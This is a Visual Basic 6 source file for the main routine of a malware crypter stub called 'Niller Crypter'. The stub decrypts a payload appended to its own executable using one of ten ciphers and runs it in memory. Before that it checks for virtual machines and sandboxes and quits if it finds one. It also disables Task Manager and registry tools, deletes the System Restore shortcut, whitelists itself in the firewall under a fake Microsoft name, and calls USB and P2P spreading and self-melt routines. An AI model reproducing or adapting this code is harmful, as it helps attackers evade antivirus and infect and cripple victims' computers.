Attribute VB_Name = "nMain"
Option Explicit
Dim enc0 As New clsRC4
Dim enc1 As New clsSimpleXOR
Dim enc2 As New clsSkipjack
Dim enc3 As New clsGost
Dim enc4 As New clsCryptAPI
Dim enc5 As New clsDES
Dim enc6 As New clsTEA
Dim enc7 As New clsTwofish
Dim enc8 As New clsBlowfish
Dim enc9 As New clsSerpent
Dim Reg As Object
Dim Indetectables As String, Niller As String, Datos2010() As String, Opciones2010() As String, Error2010() As String, Encriptar As String, Unimos() As Byte
Sub Main()

Indetectables = App.Path & "\" & App.EXEName & ".exe"

Open Indetectables For Binary As #1
Niller = Space(LOF(1))
Get #1, , Niller
Close #1

Datos2010() = Split(Niller, "//Niller||Crypter\\")
Opciones2010() = Split(Niller, "//Niller||Opciones\\")
Error2010() = Split(Niller, "//Niller||Error\\")


If Opciones2010(1) = 1 Then
If IsVirtualPCPresent = 1 Then End
End If

If Opciones2010(2) = 1 Then
If IsVirtualPCPresent = 3 Then End
End If

If Opciones2010(3) = 1 Then
If IsVirtualPCPresent = 2 Then End
End If

If Opciones2010(4) = 1 Then
Timer.Timer1.Enabled = True
End If

If Opciones2010(5) = 1 Then
Timer.Timer3.Enabled = True
End If

If Opciones2010(6) = 1 Then
If IsInSandbox = 5 Then End
End If

If Opciones2010(7) = 1 Then
If IsInSandbox = 4 Then End
End If

If Opciones2010(8) = 1 Then
If IsInSandbox = 1 Then End
End If

If Opciones2010(9) = 1 Then
If IsInSandbox = 3 Then End
End If

If Opciones2010(10) = 1 Then
If IsInSandbox = 2 Then End
End If

If Opciones2010(11) = 1 Then
Shell "reg add hkcu\software\microsoft\windows\currentversion\policies\system /v disabletaskmgr /t reg_dword /d ""1"" /f"
End If

If Opciones2010(12) = 1 Then
Shell "reg add hkcu\software\microsoft\windows\currentversion\policies\system /v disableregistrytools /t reg_dword /d ""1"" /f"
End If

If Opciones2010(13) = 1 Then
Kill "C:\Documents and Settings\All Users\Menú Inicio\Programas\Accesorios\Herramientas del sistema\Restaurar sistema.lnk"
End If

If Opciones2010(14) = 1 Then
Set Reg = CreateObject("Wscript.Shell")
Reg.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List\" & "Microsoft Internet Settings", Indetectables
Reg.regwrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile\AuthorizedApplications\List\" & "Microsoft Internet Settings", Indetectables
End If

If Opciones2010(15) = 1 Then
MsgBox "Todavia no"
End If

If Opciones2010(16) = 1 Then
Timer.Timer2.Enabled = True
End If

If Opciones2010(17) = 1 Then
Call USBX
End If

If Opciones2010(18) = 1 Then
Call P2PX
End If

If Opciones2010(19) = 1 Then
Call MeltX
End If

If Error2010(1) = 1 Then
MsgBox Error2010(3), Error2010(4), Error2010(2)
End If

If Datos2010(2) = "1" Then
Encriptar = enc0.DecryptString(Datos2010(1), Datos2010(3))
GoTo Crypt
End If

If Datos2010(2) = "2" Then
Encriptar = enc1.DecryptString(Datos2010(1), Datos2010(3))
GoTo Crypt
End If

If Datos2010(2) = "3" Then
Encriptar = enc2.DecryptString(Datos2010(1), Datos2010(3))
GoTo Crypt
End If

If Datos2010(2) = "4" Then
Encriptar = enc3.DecryptString(Datos2010(1), Datos2010(3))
GoTo Crypt
End If

If Datos2010(2) = "5" Then
Encriptar = enc4.DecryptString(Datos2010(1), Datos2010(3))
GoTo Crypt
End If

If Datos2010(2) = "6" Then
Encriptar = enc5.DecryptString(Datos2010(1), Datos2010(3))
GoTo Crypt
End If

If Datos2010(2) = "7" Then
Encriptar = enc6.DecryptString(Datos2010(1), Datos2010(3))
GoTo Crypt
End If

If Datos2010(2) = "8" Then
Encriptar = enc7.DecryptString(Datos2010(1), Datos2010(3))
GoTo Crypt
End If

If Datos2010(2) = "9" Then
Encriptar = enc8.DecryptString(Datos2010(1), Datos2010(3))
GoTo Crypt
End If
Exit Sub

If Datos2010(2) = "10" Then
Encriptar = enc9.DecryptString(Datos2010(1), Datos2010(3))
GoTo Crypt
End If
Exit Sub

Crypt:
Unimos() = StrConv(Encriptar, vbFromUnicode)
Call CMAQEQL(Indetectables, Unimos(), vbNullString)
End Sub


